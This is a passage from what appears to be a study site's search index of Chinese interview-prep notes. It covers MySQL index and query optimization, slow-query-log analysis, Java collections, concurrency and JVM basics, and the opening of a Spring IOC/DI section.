RESULT | UNION合并的结果集 | ==type 访问类型== 一般来说，保证查询至少达到range级别，最好能达到ref级别 数据很少的情况下，MySQL优化器可能会直接走表查询而不会走索引查询。因为MySQL优化器觉得走表或走索引是差不多的 衡量你的sql语句性能好坏的参考指标，以消除ALL为己任，如果出现ALL代表没有命中索引，是全表查询 rows 检查行数 它体现建立索引以后，优化的行数，越小速度越快，如果你建立索引，type=ref并且也命中到了，但是row还很大，那说明该表已经没有建立索引的意义了，已经优化到了极限(索引不是万能的)，你需要通过其它持术手段来优化。比如：分库分表、缓存、把数据迁移到es/solr 避免索引失效 使用索引列进行查询 联合索引：采用最左匹配原则 最左边的索引没用到，则失效（无关顺序）；中间断了，则后面的索引也失效 索引列最好不要出现范围条件、比较运算符!=、<>、>、>=、or、is not null、内置函数，数据类型要匹配 如果采用like模糊查询，%要在后面 索引的选择 建立索引的时机 在中小型公司，刚开始开发项目的时候不需要关注太多的性能问题，一般不去建立索引。 项目上线运行一段时间，刚开始查询很快，后面就查询很慢，可能需要考虑建立索引。 用工具分析慢查询SQL日志文件，如果有查询慢的SQL，把慢查询SQL通过explain执行计划进行分析，然后建立相关的索引。 当你发现一张表的数据量，每天增长的非常大，那这个也需要考虑建立索引了。千万不要等到数据达到几百万甚至上千万的时候去建立索引。 如果表的数据量不是很大（几千，几万，几十万）这种表就不需要建立索引。 适合建立索引 表的主键列(primary key) 频繁作为查询条件的列应该创建索引(比如银行系统银行帐号，电信系统的手机号) 查询中与其它表关联的列，外键关系建立索引(比如员工表的部门外键) 查询中排序的列，排序列若通过索引去访问将大大提升排序速度(索引能够提高检索速度和排序速度) 查询中统计或分组的列 不适合建立索引 记录比较少的表 频繁更新的列不适合建立索引(每次更新不单单更新数据，还要更新索引) where条件里用不到的列 数据重复的列，如果某列包含了许多重复的内容，比如表中的某列为国籍、性别、数据的差异率不高，这种列建立索引就没有太大的意义 MySQL语句优化 排序与分组优化 如果排序的字段没有建立索引，会使用文件排序（USING filesort），文件排序的效率是相对较低的。目标就是消灭 Using filesort，避免排序时使用文件排序。 注意: order by本身是不会走索引，如果你想要order by走索引，那么必须前面的where一定要有索引，并且遵循最左匹配原则。 注意点： 联合索引在order by后面顺序不一致，会触发文件排序 排序时的顺序使用一升一降，会触发文件排序 大数据量分页优化 业务上尽量避免 用户实际上是不会查看完所有内容的，只需要将重点部分和用户感兴趣的部分进行展示即可 使用ID限定 -- 使用id限定方案，将上一页的ID传递过来，根据id范围进行分页查询 -- 通过程序的设计，持续保留上一页的ID，并且ID保证自增 -- limit 3000000,20 时间: 2.266s -> 时间: 0.005s (使用条件有些苛刻 但效率非常高) select * from system_user where id > 3000000 limit 20; 子查询优化（存疑） -- 通过explain发现，之前我们没有利用到索引，这次我们利用索引查询出对应的所有ID -- 在通过关联查询，查询出对应的全部数据，性能有了明显提升(失去了默认的按主键id排序) -- limit 3000000,20 时间: 2.251s -> 时间: 1.364s explain select * from system_user u, (select id from system_user limit 3000000, 20) t where u.id = t.id; -- 需要指定id排序 explain select * from system_user u, (select id from system_user ORDER by id limit 3000000, 20) t where u.id = t.id; 小表驱动大表 MySQL表关联的算法是 Nest Loop Join(嵌套循环连接)，是通过驱动表的结果集作为循环基础数据，然后一条一条地通过该结果集中的数据作为过滤条件到下一个表中查询数据，然后合并结果。如果小的循环在外层，外层表只需要锁5次，如果1000在外，则需要锁1000次，从而浪费资源，增加消耗。这就是为什么要小表驱动大表。 当外表数据多于内表中的数据时，使用in 当外表数据小于内表中的数据时，使用exists 如果两张表数据量差不多，那么它们的执行性能差不多 in&exists -- 使用in 时间: 8.292ms select * from system_user where id in (select id from department); 使用department表中数据作为外层循环 5次 for(select id from department d) 每次循环执行employee表中的查询 300万次 for( select * from system_user e where e.dep_id=d.id) -- 使用exists 时间: 14.771ms SELECT * FROM system_user s WHERE EXISTS (SELECT 1 FROM department d WHERE d.id = s.id); 使用employee表中数据作为外层循环 300万次 for(select * from system_user e) 每次循环执行department表中的查询 5次 for( select 1 from department d where d.id = e.dep_id) 慢查询性能分析 开启慢查询日志 -- 查看慢查询日志变量 show variables like '%slow_query_log%'; show variables like '%slow_query_log_file%'; show variables like '%long_query_time%'; -- 开启方式一: 只对当前数据库生效，MySQL重启后，会失效 0=OFF 1=ON set global slow_query_log=1; # 开启方式二: 想永久生效，修改配置文件my.ini，然后重启MySQL(推荐) # 开启MySQL慢查询日志,要配置在[mysqld]下方 slow_query_log=1 slow_query_log_file=F:/mysqlslowquery.log # 设置慢查询的阈值(默认: 10s) long_query_time=0.2 慢查询日志分析 如何找到查询慢的SQL，以及如何优化？ 开启慢查询日志(DBA) 查找慢查询SQL explain进行慢查询SQL分析 SQL语句调优，数据库服务器参数调优(DBA) 可以通过慢查询日志工具进行分析，MySQL默认安装了mysqldumpslow.pl工具实现对慢查询日志信息的分析 -- 得到返回记录集最多的10个SQL。 perl mysqldumpslow.pl -s r -t 10 F:\\mysqlslowquery.log -- 得到访问次数最多的10个SQL perl mysqldumpslow.pl -s c -t 10 F:\\mysqlslowquery.log Count: 2（执行了多少次） Time=6.99s(13s) 平均执行的时间（总的执行时间） Lock=0.00s(0s)（等待锁的时间） Rows=1661268.0（每次返回的记录数） (3322536)（总共返回的记录数) username[password]@[localhost] 参数说明 -s 按照那种方式排序 c: 访问统计 l: 锁定时间 r: 返回记录 al: 平均锁定时间 ar: 平均访问记录数 at: 平均查询时间 -t 是top，返回多少条数据。 -g 可以跟上正则匹配模式，大小写不敏感。 常见面试题 问题1: 下面查询语句，索引的使用情况? -- 建立联合索引(a,b,c)，请说出下列条件的索引使用情况 select * from table where a=4 使用到索引a select * from table where a=4 and b=6 使用到了索引a,b select * from table where a=4 and c=5 and b=6 使用到了索引a,b,c select * from table where b=4 or b=5 没使用到索引 select * from table where a=4 and c=6 使用到索引a select * from table where a=4 and b>5 and c=6 使用到索引a,b select * from table where a=4 and b like 'test%' and c=6 使用索引a,b b条件相当于范围查询 select * from table where a=4 order by b,c 使用到索引a 不会产生Using FileSort select * from table where b=5 order by a 没使用索引 产生Using Filesort select * from table where b=5 order by c 没使用索引 产生Using Filesort select * from table where a=5 group by b,c 使用索引a 不会产生Using temporary 问题2: 什么是索引? 数据库索引的本质是: 数据结构 是一种b+tree的数据结构，它有二叉树的特征，同时解决平衡和深度的问题，这种数据结构能够帮助我们快速的获取数据库中的数据。 在B+tree中，所有数据记录节点都是按照大小顺序存放在同一层叶子节点上，所有叶子节点之间都有指针连接，而非叶子节点只存储key值信息，可以大大增加每个节点存储到key值的数量，降低树的高度，减少IO次数。 问题3: 索引的作用? 当表中的数据量越来越大时，索引对于性能的影响愈发重要。索引优化应该是对查询性能优化最有效的手段。索引能够轻易将查询性能提高好几倍。有了索引相当于我们给数据库的数据加了目录一样，可以快速的找到数据，简单来说是提高数据查询的效率。 问题4: 索引的分类? 1.普通索引 2.主键索引 3.唯一索引 4.联合索引（组合索引） 5.全文索引 问题5: 索引的原理? 索引的实现本质上是为了让数据库能够快速查找数据，而单独维护的数据结构，mysql实现索引主要使用的两种数据结构: hash 和 B+Tree，我们比较常用的MyISAM和InnoDB存储引擎都是基于B+Tree的。 hash:（hash索引在MySQL比较少用）他以把数据的索引以hash形式组织起来，因此当查找某一条记录的时候，速度非常快。但是因为是hash结构，每个键只对应一个值，而且是散列的方式分布，所以他并不支持范围查找和排序等功能。 B+树:B+Tree是(MySQL使用最频繁的一个索引数据结构)数据结构，B+Tree每个节点可以存放多个数据，相比二叉树，树的高度更低，磁盘IO更少，查询效率更高。因为是树型结构，所以更适合用来处理排序，范围查找等功能。 问题6: 索引的优点? 1. 可以通过建立唯一索引或者主键索引,保证数据库表中每一行数据的唯一性。 2. 建立索引,可以大大提高检索的数据,以及减少表的检索行数。 3. 建立索引,在表连接条件时,可以加速表与表直接的相连。 4. 建立索引,在分组和排序时,可以减少查询时分组和排序所消耗的时间。 5. 建立索引,在查询中使用索引可以提高性能。 问题7: 索引的缺点? 1. 在创建索引和维护索引时,会耗费时间,随着数据量的增加而增加。 2. 索引文件会占用物理空间,除了数据表需要占用物理空间之外,每一个索引还会占用一定的物理空间。 3. 当对表进行INSERT,UPDATE,DELETE的时候,索引也要维护,这样就会降低数据的维护速度(建立索引会占用磁盘空间的索引文件。一般情况这个问题不太严重，但如果你在一个大表上创建了多种组合索引，索引文件的会膨胀很快)。 问题8: 如何分析索引使用情况? explain显示了MySQL如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。简单讲，它的作用就是分析查询性能。explain关键字的使用方法很简单，就是把它放在select查询语句的前面。MySQL查看是否使用索引，简单的看type类型就可以。如果它是all，那说明这条查询语句遍历了所有的行，并没有使用到索引。 问题9: 哪些字段适合加索引? 1. 在经常需要搜索的列上添加索引,可以加快搜索的速度。 2. 主键列上可以确保列的唯一性。 3. 在表与表的而连接条件上加上索引,可以加快连接查询的速度。 4. 在经常需要排序(order by),分组(group by)和的distinct列上加索引可以加快排序查询的时间。 问题10: 哪些字段不适合加索引 1. 查询中很少使用到的列不应该创建索引,如果建立了索引然而还会降低mysql的性能和增大了空间需求。 2. 很少数据的列也不应该建立索引,比如一个性别字段0或者1,在查询中,结果集的数据占了表中数据行的比例比较大,MySQL需要扫描的行数很多,增加索引,并不能提高效率。 3. 定义为text和image和bit数据类型的列不应该增加索引。 4. 当表的修改(UPDATE,INSERT,DELETE)操作远远大于检索(SELECT)操作时不应该创建索引,这两个操作是互斥的关系。 问题11: 哪些情况会造成索引失效? 1. 如果条件中有or，即使其中有条件带索引也不会使用(这也是为什么尽量少用or的原因)。 2. 索引字段的值不能有null值，有null值会使该列索引失效。 3. 对于联合索引，不是使用的第一部分，则不会使用索引（最左原则）。 4. like查询以%开头。 5. 如果列类型是字符串，那一定要在条件中将数据使用单引号引用起来,否则不使用索引。 6. 在索引的列上使用表达式或者函数会使索引失效。 问题12: 联合索引最左原则? 在MySQL建立联合索引时会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配，组合索引的第一个字段必须出现在查询组句中，这个索引才会被用到, 如创建组合索引a,b,c那么查询条件中只使用b和c是使用不到索引的。 问题13: 聚簇索引和非聚簇索引? 1. MyISAM——非聚簇索引 MyISAM存储引擎采用的是非聚簇索引，非聚簇索引的数据表和索引表是分开存储的。非聚簇索引的主键索引和辅助索引几乎是一样的，只是主索引不允许重复，不允许空值，他们的叶子结点的key都存储指向键值对应的数据的物理地址。 2. InnoDB——聚簇索引 聚簇索引的数据和主键索引存储在一起，主键索引的叶子结点存储的是键值对应的数据本身，辅助索引的叶子结点存储的是键值对应的数据的主键键值。因此主键的值长度越小越好，类型越简单越好。 问题14: in和exists区别? 1.当A表数据多于B表中的数据时，使用in优于exists。 2.当A表数据小于B表中的数据时，使用exists优于in。 3.如果两张表数据量差不多，那么它们的执行性能差不多。 问题15: 我有三个表 A,B,C 现在有一个select * from A,B,C你能告诉我？A,B,C三个表在查询的的执行顺序是什么? 一定通过explain查询id的值才能决定。如果排id相同那么至上而下运行。如果id不同，大的先执行。 问题16: like查询中哪那些会走索引那些不会走索引？ -- b 建立了一个索引 select * from table where b like '%xxxx%' -- 不会 select * from table where b like 'xxxx%' -- 会 select * from table where b like '%xxxx' -- 不会 问题17: MySQL事务隔离级别? 问题18: MySQL中锁的分类? 1.按操作分: 读锁(共享锁)、写锁(排它锁) 2.按粒度分: 表锁、页锁、行锁 MySQL一页是16kB 3.思想的层面分: 悲观锁、乐观锁 问题19: MySQL中有几种连接查询? 1. 内连接(inner join): 只有两个元素表相匹配的才能在结果集中显示。 2. 外连接： 2.1 左外连接(left join): 左边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示。 2.2 右外连接(right join): 右边为驱动表，驱动表的数据全部显示，匹配表的不匹配的不会显示。 union: 联合查询,将多个查询的结果组合在一起, 去重 union all: 联合查询,将多个查询的结果组合在一起, 不去重 问题20: MySQL如何综合性优化? 1.选择表合适存储引擎: MyISAM: 以读和插入操作为主，只有少量的更新和删除，并且对事务的完整性，并发性要求不是很高的。 InnoDB: 事务处理，以及并发条件下要求数据的一致性。除了插入和查询外，包括很多的更新和删除。 1.1 合理的设计表(满足3范式) 2.索引优化: -- 表一定要建立主键索引。 -- 数据量大的表应该有索引。 -- 经常与其他表进行连接的表，在连接字段上应该建立索引。 -- 经常出现在Where子句中的字段，特别是大表的字段，应该建立索引。 -- 索引应该建在选择性高的字段上（sex 性别这种就不适合）。 -- 索引应该建在小字段上，对于大的文本字段甚至超长字段，不要建索引。 -- 频繁进行数据操作的表，不要建立太多的索引。 -- 删除无用的索引，避免对执行计划造成负面影响。 3.sql语句优化: -- SELECT语句务必指明列的名称（避免直接使用select * ） -- SQL语句要避免造成索引失效的写法 -- SQL语句中IN包含的值不应过多 -- 如果排序字段没有用到索引，就尽量少排序 -- 尽量少用or -- 尽量用union all代替 union -- 避免在where子句中对字段进行null值判断 -- 不建议使用%前缀模糊查询 -- 避免在where子句中对列进行表达式或函数操作 4.缓存优化: 为了提高查询速度，我们可以通过不同的方式去缓存我们的结果从而提高响应效率。当我们的数据库打开了Query Cache（简称QC）功能后，数据库在执行SELECT语句时，会将其结果放到QC中，当下一次处理同样的SELECT请求时，数据库就会从QC取得结果，而不需要去数据表中查询。如果缓存命中率非常高的话，有测试表明在极端情况下可以提高效率238%。 5.读写分离: 如果数据库的使用场景读的操作比较多的时候，为了避免写的操作所造成的性能影响 可以采用读写分离的架构，读写分离，解决的是，数据库的写入，影响了查询的效率。读写分离的基本原理是让主数据库处理事务性增、改、删操作（INSERT、UPDATE、DELETE），而从数据库处理SELECT查询操作。 6.MySQL的分库分表: 数据量越来越大时，单体数据库无法满足要求，可以考虑分库分表 两种拆分方案： 垂直拆分, 水平拆分 表的垂直拆分:就是把原来一个有很多列的表拆分成多个表。 通常垂直拆分可以按以下原则进行： 1、把不常用的字段表单独存放到一个表中。 2、把大字段独立存放到一个表中。 3、把经常一起使用的字段放到一起。 表的水平拆分: 是为了解决单表数据量过大的问题，水平拆分的表每一个表的结构都是完全一致的，将数据平均分为N份 分库分表常用中间件: MyCat、Sharding-JDBC 运维 修改数据库的配置 增加硬件 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-09 11:52 "},"面试必会篇/01-面试必会-JAVA基础篇.html":{"url":"面试必会篇/01-面试必会-JAVA基础篇.html","title":"01-面试必会-JAVA基础篇","keywords":"","body":"1. Final 有什么用？ 被final修饰的类不可以被继承 被final修饰的方法不可以被重写 被final修饰的变量不可以被改变， 被final修饰不可变的是变量的引用，而不是引用指向的内容， 引用指向的内容是可以改变的 2. 什么是重载（Overload）和重写（Override） ? 重载：发生在同一个类中，方法名相同参数列表不同（参数类型不同、个数不同、顺序不同），与 方法返回值和访问修饰符无关，即重载的方法不能根据返回类型进行区分 重写：发生在父子类中，方法名、参数列表必须相同，返回值小于等于父类，抛出的异常小于等于 父类，访问修饰符大于等于父类（里氏代换原则）；如果父类方法访问修饰符为private则子类中 就能是重写。 3. 重载的方法能否根据返回类型进行区分？ 方法重载不可以根据返回类型区分 4. == 和 equals 的区别是什么 == : 它的作用是判断两个对象的地址是不是相等。即，判断两个对象是不是同一个对象。(基本数 据类型 == 比较的是值，引用数据类型 == 比较的是内存地址) equals() : 它的作用也是判断两个对象是否相等。 5. 什么是反射机制？ JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任 意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法 的功能称为java语言的反射机制。 6. 反射机制优缺点 优点： 运行期类型的判断，动态加载类，提高代码灵活度。 缺点： 性能瓶颈：反射相当于一系列解释操作，通知 JVM 要做的事情，性能比直接的java代码要 慢很多 7. 在你进行项目开发的过程中有没有用到过反射 在我们的项目中经常会使用反射 + 自定义注解的方式去实现一些功能 , 例如 : 在前后端交互的时候, 后端Long类型返回前端后会产生精度丢失 , 我们的处理方式就是在服务端, 通过配置修改Jackson的序列化规则, 将一些Long类型字段转化为字符串返回给前端, 这个时候我们自定义了一个@IdEncrpt注解 , 通过反射获取类的属性, 判断属性上是否添加了@IdEncrpt注解, 如果添加了 , 就会通过反射获取属性值, 转化为字符串 在整合EMQ的时候 , 为了能够方便的接收订阅消息, 我们自定义了一个@Topic注解 , 作用在类上 , 之后我们通过反射获取类的字节码, 并且获取类上的@Topic注解, 读取到里面定义的主题 , 通过策略模式将不同主题的消息分发到不同的处理器中 除了上述之外, 在我们项目开发中经常使用的一些框架, 例如 : Mybatis , Spring , SpringMVC 等, 以及一些常用的工具库 common-utils , hutool工具库等都大量使用到了反射机制 8. String和StringBuffer、StringBuilder的区别是什么？ 可变性 : String类中使用字符数组保存字符串，所以string对象是不可变 的。 StringBuilder与StringBuffer这两种对象都是可变的。 线程安全性 : String中的对象是不可变的，也就可以理解为常量，线程安全。StringBuffer对方法加了同步锁或者对调用的方法加了同 步锁，所以是线程安全的。StringBuilder并没有对方法进行加同步锁，所以是非线程安全的。 性能 : 每次对String 类型进行改变的时候，都会生成一个新的String对象，然后将指针指向新的String 对 象。StringBuffer每次都会对StringBuffer对象本身进行操作，而不是生成新的对象并改变对象引 用。 StirngBuilder 相比使用StringBuffer而言效率更高 9. java常见的集合类有哪些 Map接口和Collection接口是所有集合框架的父接口： Collection接口的子接口包括：Set接口和List接口 Map接口的实现类主要有：HashMap、TreeMap、Hashtable、ConcurrentHashMap以及 Properties等 Set接口的实现类主要有：HashSet、TreeSet、LinkedHashSet等 List接口的实现类主要有：ArrayList、LinkedList、Stack以及Vector等 10. 常用的线程安全的类有哪些 ? 1. Vector：就比Arraylist多了个 synchronized （线程安全），因为效率较低，现在已经不太建议使 用。 2. hashTable：就比hashMap多了个synchronized (线程安全)，不建议使用。 3. ConcurrentHashMap：是Java5中支持高并发、高吞吐量的线程安全HashMap实现 11. ArrayList 和 LinkedList 的区别是什么？ 数据结构实现：ArrayList 是动态数组的数据结构实现，而 LinkedList 是双向链表的数据结构实 现。 随机访问效率：ArrayList 比 LinkedList 在随机访问的时候效率要高，因为 LinkedList 是线性的数 据存储方式，所以需要移动指针从前往后依次查找。 增加和删除效率：在非首尾的增加和删除操作，LinkedList 要比 ArrayList 效率要高，因为 ArrayList 增删操作要影响数组内的其他数据的下标。 内存空间占用：LinkedList 比 ArrayList 更占内存，因为 LinkedList 的节点除了存储数据，还存储 了两个引用，一个指向前一个元素，一个指向后一个元素。 线程安全：ArrayList 和 LinkedList 都是不同步的，也就是不保证线程安全； 12. 说一下HashMap的实现原理？ HashMap的数据结构： HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体。 HashMap 基于 Hash 算法实现的 当我们往HashMap中put元素时，利用key的hashCode重新hash计算出当前对象的元素在数 组中的下标 存储时，如果出现hash值相同的key，此时有两种情况。 如果key相同，则覆盖原始值； 如果key不同（出现冲突），则将当前的key-value放入链表中 获取时，直接找到hash值对应的下标，在进一步判断key是否相同，从而找到对应值。 HashMap JDK1.8之前 JDK1.8之前采用的是拉链法。拉链法：将链表和数组相结合。也就是说创建一个链表数组，数组中每一格就是一个链表。若遇到哈希冲突，则将冲突的值加到链表中即可。 HashMap JDK1.8之后 相比于之前的版本，jdk1.8在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为8） 时，将链表转化为红黑树，以减少搜索时间。扩容 resize( ) 时，红黑树拆分成的 树的结点数小于等于临界值6个，则退化成链表。 13. HashMap的put方法的具体流程？ 判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容； 根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向 ⑥，如果table[i]不为空，转向③； 判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的 是hashCode以及equals； 判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值 对，否则转向5； 遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操 作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可； 插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩 容。 14. 讲一讲HashMap的扩容机制 在jdk1.8中，resize方法是在hashmap中的键值对大于阀值(0.75)时或者初始化时，就调用resize方法进 行扩容； 每次扩展的时候，都是扩展2倍； 扩展后Node对象的位置要么在原位置，要么移动到原偏移量两倍的位置。 在putVal()中，我们看到在这个函数里面使用到了2次resize()方法，resize()方法表示的在进行第一 次初始化时会对其进行扩容，或者当该数组的实际大小大于其临界值值(第一次为12) , 这个时候在扩 容的同时也会伴随的桶上面的元素进行重新分发，这也是JDK1.8版本的一个优化的地方，在1.7 中，扩容之后需要重新去计算其Hash值，根据Hash值对其进行分发，但在1.8版本中，则是根据 在同一个桶的位置中进行判断(e.hash & oldCap)是否为0，重新进行hash分配后，该元素的位置 要么停留在原始位置，要么移动到原始位置+增加的数组大小这个位置上 15. ConcurrentHashMap 底层具体实现知道吗？ ConcurrentHashMap 是一种线程安全的高效Map集合 底层数据结构： JDK1.7的 ConcurrentHashMap 底层采用 分段的数组+链表 实现， JDK1.8 采用的数据结构跟HashMap1.8的结构一样，数组+链表/红黑二叉树。 JDK1.7 首先将数据分为一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段 数据时，其他段的数据也能被其他线程访问。 在JDK1.7中，ConcurrentHashMap采用Segment + HashEntry的方式进行实现 一个 ConcurrentHashMap 里包含一个 Segment 数组。Segment 的结构和HashMap类似，是一 种数组和链表结构，一个 Segment 包含一个 HashEntry 数组，每个 HashEntry 是一个链表结构 的元素，每个 Segment 守护着一个HashEntry数组里的元素，当对 HashEntry 数组的数据进行修 改时，必须首先获得对应的 Segment的锁。 Segment 是一种可重入的锁 ReentrantLock，每个 Segment 守护一个HashEntry 数组里得元 素，当对 HashEntry 数组的数据进行修改时，必须首先获得对应的 Segment 锁。 JDK1.8 在JDK1.8中，放弃了Segment臃肿的设计，取而代之的是采用Node + CAS + Synchronized来保 证并发安全进行实现，synchronized只锁定当前链表或红黑二叉树的首节点，这样只要hash不冲 突，就不会产生并发 , 效率得到提升 16. 创建线程的四种方式 继承 Thread 类； 实现 Runnable 接口； 实现 Callable 接口； 使用匿名内部类方式 17. runnable 和 callable 有什么区别 Runnable 接口 run 方法无返回值；Callable 接口 call 方法有返回值，是个泛型，和Future、 FutureTask配合可以用来获取异步执行的结果 Runnable 接口 run 方法只能抛出运行时异常，且无法捕获处理；Callable 接口 call 方法允许抛出 异常，可以获取异常信息 注：Callalbe接口支持返回执行结果，需要调用FutureTask.get()得到， 此方法会阻塞主进程的继续往下执行，如果不调用不会阻塞。 18. 加锁的方式有哪些 ? 使用synchronized关键字 使用Lock锁 synchronized和Lock有什么区别 ? 首先synchronized是Java内置关键字，在JVM层面，Lock是个Java类； synchronized 可以给类、方法、代码块加锁；而 lock 只能给代码块加锁。 synchronized 不需要手动获取锁和释放锁，使用简单，发生异常会自动释放锁，不会造成死锁； 而 lock 需要自己加锁和释放锁，如果使用不当没有 unLock()去释放锁就会造成死锁。 通过 Lock 可以知道有没有成功获取锁，而 synchronized 却无法办到。 19. 如果你提交任务时，线程池队列已满，这时会发生什么 有俩种可能： 如果使用的是无界队列 LinkedBlockingQueue，也就是无界队列的话，没关系，继续添加任务到 阻塞队列中等待执行，因为 LinkedBlockingQueue 可以近乎认为是一个无穷大的队列，可以无限存放 任务 如果使用的是有界队列比如 ArrayBlockingQueue，任务首先会被添加到ArrayBlockingQueue 中ArrayBlockingQueue 满了，会根据maximumPoolSize 的值增加线程数量，如果增加了线程数量 还是处理不过来，ArrayBlockingQueue 继续满，那么则会使用拒绝策略RejectedExecutionHandler 处理满了的任务，默认是 AbortPolicy 19. 在你们的项目中有没有使用到线程池 我们的项目中很多地方使用了线程池 , 使用的场景经常有如下几种情况 业务层处理分多个业务线 , 多条业务线的优先级有高有低 , 使用异步线程池执行优先级较低的业务 比如: 搜索历史记录的异步保存 , 用户行为数据异步入库 任务很多很重 , 比如说 : 现在有1000w数据需要进行统计运算 (10个线程 每个线程计算100w数据 , 计算完毕之后把10个线程结算结果合并即可) 每天晚上计算运营统计数据 , 售货机补货数据计算 20. 你了解的线程池的种类有哪些 ? newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回 收空闲线程，若无可回收，则新建线程。 newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列 中等待。 newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。 newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任 务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。 21. 线程池的核心参数有哪些 ? corePoolSize 核心线程数量 maximumPoolSize 最大线程数量 keepAliveTime 线程保持时间，N个时间单位 unit 时间单位（比如秒，分） workQueue 阻塞队列 threadFactory 线程工厂 handler 线程池拒绝策略 22. 你们项目中使用线程池, 核心线程数如何配置 ? IO密集型任务 : 核心线程数的数量 约等于 CPU核心数 * 2-3倍 计算密集型任务 : 核心线程数 约等于 CPU核心数+1 23.线程池的执行原理知道嘛 提交一个任务到线程池中，线程池的处理流程如下： 判断线程池里的核心线程是否都在执行任务，如果不是（核心线程空闲或者还有核心线程没有被创建）则创建一个新的工作线程来执行任务。如果核心线程都在执行任务，则进入下个 流程。 线程池判断工作队列是否已满，如果工作队列没有满，则将新提交的任务存储在这个工作队 列里。如果工作队列满了，则进入下个流程。 判断线程池里的线程是否都处于工作状态，如果没有，则创建一个新的工作线程来执行任 务。如果已经满了，则交给饱和策略来处理这个任务。 24. 新建 T1、T2、T3 三个线程，如何保证它们按顺序执行？ 用 join 方法 25. 讲一讲JVM的组成 JVM包含两个子系统和两个组件: 两个子系统为Class loader(类装载)、Execution engine(执行引 擎)； 两个组件为Runtime data area(运行时数据区)、Native Interface(本地接口)。 Class loader(类装载)：根据给定的全限定名类名(如：java.lang.Object)来装载class文件到 Runtime data area中的method area。 Execution engine（执行引擎）：执行classes中的指令。 Native Interface(本地接口)：与native libraries交互，是其它编程语言交互的接口。 Runtime data area(运行时数据区域)：这就是我们常说的JVM的内存。 26. JAVA代码在JVM是怎么执行的 首先通过编译器把 Java 代码转换成字节码，类加载器（ClassLoader）再把字节码加载到 内存中，将其放在运行时数据区（Runtime data area）的方法区内，而字节码文件只是 JVM 的一 套指令集规范，并不能直接交给底层操作系统去执行，因此需要特定的命令解析器执行引擎 （Execution Engine），将字节码翻译成底层系统指令，再交由 CPU 去执行，而这个过程中需要 调用其他语言的本地库接口（Native Interface）来实现整个程序的功能。 27. 说一下 JVM 运行时数据区 Java 虚拟机在执行 Java 程序的过程中会把它所管理的内存区域划分为若干个不同的数据区域。这 些区域都有各自的用途，以及创建和销毁的时间，有些区域随着虚拟机进程的启动而存在，有些区 域则是依赖线程的启动和结束而建立和销毁。Java 虚拟机所管理的内存被划分为如下几个区域 程序计数器（Program Counter Register）：当前线程所执行的字节码的行号指示器，字节码解 析器的工作是通过改变这个计数器的值，来选取下一条需要执行的字节码指令，分支、循环、跳 转、异常处理、线程恢复等基础功能，都需要依赖这个计数器来完成； 为什么要线程计数器？因为线程是不具备记忆功能 Java 虚拟机栈（Java Virtual Machine Stacks）：每个方法在执行的同时都会在Java 虚拟机栈中创 建一个栈帧（Stack Frame）用于存储局部变量表、操作数栈、动态链接、方法出口等信息； 栈帧就是Java虚拟机栈中的下一个单位 本地方法栈（Native Method Stack）：与虚拟机栈的作用是一样的，只不过虚拟机栈是服务 Java 方法的，而本地方法栈是为虚拟机调用 Native 方法服务的； Native 关键字修饰的方法是看不到的，Native 方法的源码大部分都是 C和C++ 的代码 Java 堆（Java Heap）：Java 虚拟机中内存最大的一块，是被所有线程共享的，几乎所有的对象实例都在这里分配内存； 方法区（Methed Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译后的 代码等数据。 28. 堆栈的区别是什么？ 29. 什么是类加载器，类加载器有哪些? 主要有一下四种类加载器: 启动类加载器(Bootstrap ClassLoader)用来加载java核心类库，无法被java程序直接引用。 扩展类加载器(extensions class loader):它用来加载 Java 的扩展库。Java 虚拟机的实现会提 供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。 系统类加载器（system class loader）：它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过 ClassLoader.getSystemClassLoader()来获取它。 用户自定义类加载器，通过继承 java.lang.ClassLoader类的方式实现 30. 什么是双亲委派模型？ 双亲委派模型：如果一个类加载器收到了类加载的请求，它首先不会自己去加载这个类，而是把这 个请求委派给父类加载器去完成，每一层的类加载器都是如此，这样所有的加载请求都会被传送到 顶层的启动类加载器中，只有当父加载无法完成加载请求（它的搜索范围中没找到所需的类）时， 子加载器才会尝试去加载类。 总结就是： 当一个类收到了类加载请求时，不会自己先去加载这个类，而是将其委派给父类，由父类去加 载，如果此时父类不能加载，反馈给子类，由子类去完成类的加载。 31. 对于java的Stream流有使用过嘛 , 讲一讲stream流中的常用方法 32. jdk8有哪些新特性 函数式方法 方法引用 stream流 optional ..... Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-06-19 18:07 "},"面试必会篇/02-面试必会-SSM框架篇.html":{"url":"面试必会篇/02-面试必会-SSM框架篇.html","title":"02-面试必会-SSM框架篇","keywords":"","body":"01-什么是Spring IOC 和DI ? IOC : 控制翻转 , 它把传统上由程序代码直接操控的对象的调用权交给容 器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转 移，从程序代码本身转移到了外部容器。 DI : 依赖注入，在我们创建对象的过程中，把对象依赖的属性注入到我们的类中。 